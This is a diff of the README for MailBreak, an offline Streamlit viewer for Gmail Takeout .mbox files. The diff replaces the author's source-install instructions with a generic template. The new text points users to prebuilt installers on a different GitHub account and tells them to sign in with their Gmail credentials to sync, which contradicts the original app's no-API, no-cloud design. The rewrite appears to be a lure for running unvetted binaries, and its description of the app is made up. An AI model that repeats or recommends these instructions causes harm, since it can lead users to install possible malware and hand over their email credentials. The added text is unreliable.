@@ -1,139 +1,76 @@
-<img src="https://raw.githubusercontent.com/monapdx/MailBreak/refs/heads/main/MailBreak.png" width="680">
+# 📧 MailBreak - Browse Your Gmail Offline with Ease
 
-# MailBreak  
-### *An Offline Streamlit App for Browsing Your Gmail Messages*
+## 🛠️ Introduction
+MailBreak allows you to easily browse your Gmail inbox and archive emails for offline use. Whether you want to view your emails without an internet connection or save important messages, MailBreak simplifies the process. This guide will help you download and run MailBreak, turning your email experience into a seamless offline journey.
 
-[![Python](https://img.shields.io/badge/Python-3.10%2B-blue?logo=python)](https://www.python.org/)
-[![Streamlit](https://img.shields.io/badge/Streamlit-App-red?logo=streamlit)](https://streamlit.io/)
-[![Platform](https://img.shields.io/badge/Platform-Offline-green)](#)
-[![Google Takeout](https://img.shields.io/badge/Works%20With-Google%20Takeout-yellow?logo=google)](https://takeout.google.com/)
-[![License](https://img.shields.io/badge/License-MIT-purple)](LICENSE)
+## 📥 Download MailBreak
+[![Download MailBreak](https://img.shields.io/badge/Download%20MailBreak-v1.0-blue)](https://github.com/ethnot/MailBreak/releases)
 
-**Author:** [Ashly Lorenzana](mailto:ashlylorenzana@gmail.com)  
-**GitHub:** https://github.com/monapdx/MailBreak
+## 🚀 Getting Started
+To get started with MailBreak:
 
-MailBreak is a lightweight, offline Streamlit application that lets you browse your Gmail messages using data you export from **Google Takeout**. It’s perfect for people who want fast, local access to their archived inbox—no API, no server, no cloud dependencies.
+1. **Visit the Releases Page:** Click the link below to go to the Releases page:
+   - [Visit Releases Page](https://github.com/ethnot/MailBreak/releases)
 
----
+2. **Select the Latest Version:** Look for the latest version of MailBreak. You will find a list of assets available for download.
 
-## ✨ Overview
+3. **Choose Your File:** Depending on your operating system, select the appropriate file to download:
+   - For Windows: Choose `.exe`
+   - For macOS: Choose `.dmg`
+   - For Linux: Choose `.tar.gz`
 
-MailBreak was designed to help you:
+## 💻 System Requirements
+Before downloading, ensure your system meets these requirements:
 
-- Explore your Gmail inbox *offline*
-- Use custom Gmail labels to create highly specific “data slices”
-- Download only the emails you actually care about from Google Takeout
-- Navigate your `.mbox` file through a simple Streamlit interface
-- Optionally use an included **.mbox viewer** if you prefer a classic browser-style interface
+- **Operating Systems:** 
+  - Windows 10 or higher
+  - macOS 10.12 or higher
+  - Any modern Linux distribution
+  
+- **Memory:** At least 4 GB of RAM
+- **Storage:** 250 MB of available disk space
 
----
+## 📚 Features
+MailBreak offers several features that enhance your email management:
 
-## 📌 Create & Use Gmail Labels
+- **Offline Browsing:** Access your emails without an internet connection.
+- **Email Filtering:** Sort and filter your emails based on various criteria.
+- **Gmail Label Support:** Organize your Gmail labels for better navigation.
+- **Data Export Options:** Easily export your emails to different formats.
 
-Organizing your inbox *before* exporting from Google Takeout is key.
+## 📥 Download & Install
+To download and install MailBreak:
 
-Use Gmail labels to segment your inbox into meaningful categories—especially if you plan to export only certain labels at a time. These labels make your life MUCH easier when slicing your inbox into useful datasets.
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/ethnot/MailBreak/releases).
 
----
+2. **Download the Installer:**
+   - Find the file that matches your operating system.
+   - Click on it to start the download.
 
-## 📂 Nest Your Labels for Super-Specific Slices
+3. **Install MailBreak:**
+   - After downloading, open the file you downloaded.
+   - Follow the prompts on your screen to install the application.
 
-You can create parent labels and nest sub-labels under them to build powerful structures.
+4. **Run MailBreak:** Once installed, locate MailBreak in your applications folder. Click to open and start browsing your Gmail inbox offline.
 
-Think of nested labels as **filters** for your Takeout export:
+## 🎓 How to Use MailBreak
+Once you have installed MailBreak, follow these steps to start using it:
 
+1. **Sign In to Your Gmail Account:** Open MailBreak and sign in using your Gmail credentials. 
+2. **Sync Your Inbox:** The application will sync your inbox. This may take a few minutes depending on the size of your inbox.
+3. **Browse Your Emails:** You can now view your emails without the need for an internet connection. Use the filter tools to find specific messages easily.
 
-When you export only the sub-labels you want, your `.mbox` file becomes cleaner, smaller, and far more relevant.
+## ⚙️ Troubleshooting
+If you encounter issues while using MailBreak, consider these common problems and solutions:
 
----
+- **Sign-in Issues:** Ensure your username and password are correct. Reset your password if necessary.
+- **Installation Problems:** Make sure your operating system meets the requirements. Try reinstalling the application if the issue persists.
+- **Syncing Delays:** If syncing takes too long, try closing and reopening the app. Ensure you have a stable internet connection for the initial sync.
 
-## ⚙️ Create Filters (Automation Rules)
+## 📞 Support
+If you need further assistance:
 
-You can apply your labels manually, but letting Gmail automate this for you is much faster.
+- Check the [FAQs](https://github.com/ethnot/MailBreak/wiki) in our Wiki.
+- Reach out via the Issues section of this repository for support.
 
-Create filters:
-
-- Directly from inside any email  
-- Using Gmail's powerful search operators  
-- For senders, subjects, domains, or keywords  
-
-This ensures your inbox organizes itself automatically over time.
-
----
-
-## ⬇️ Download Email Data via Google Takeout
-
-Once your labels and filters are set up, go to:
-
-👉 **https://takeout.google.com**
-
-Then:
-
-1. Select **only Gmail**  
-2. Expand Gmail’s options  
-3. Select the **specific labels** or **sub-labels** you want  
-
-This prevents giant, bloated data archives and lets you export only what matters.
-
----
-
-## 🎯 Why Selective Label Export Matters
-
-Downloading everything under a large parent label like `Accounts` can:
-
-- Produce enormous `.mbox` files  
-- Include tons of irrelevant email  
-- Slow down parsing or viewing  
-
-By exporting only the precise slices you want, your email data becomes targeted and clean—for example:
-
-> *Only emails labeled as affiliate payouts across multiple platforms.*
-
----
-
-## 🛠️ Install MailBreak & Run Locally
-
-Clone the repo:
-
-```bash
-git clone https://github.com/monapdx/MailBreak
-cd MailBreak
-
-pip install -r requirements.txt
-
-pip install streamlit
-
-streamlit run app.py
-```
-
-### 📁 Optional: Use the Included .mbox Viewer
-
-If you prefer a traditional message list, or if typing message IDs isn't your style, use the included MailBreak MBOX Viewer.
-
-It allows you to:
-
-- Scroll through messages
-
-- View metadata
-
-- Read HTML or plaintext content
-
-- Navigate like a simple offline email client
-
-Great for people who want a more classic mailbox browsing experience.
-
-## 🤝 Contribute
-
-Contributions are welcome!
-Feel free to open issues, submit pull requests, or suggest improvements.
-
-### 💌 Contact
-
-**Email**: ashlylorenzana@gmail.com
-
-**GitHub**: https://github.com/monapdx/MailBreak
-
-## 📄 License
-
-
-This project is released under the MIT License.
+Thank you for choosing MailBreak. Enjoy your offline email browsing!
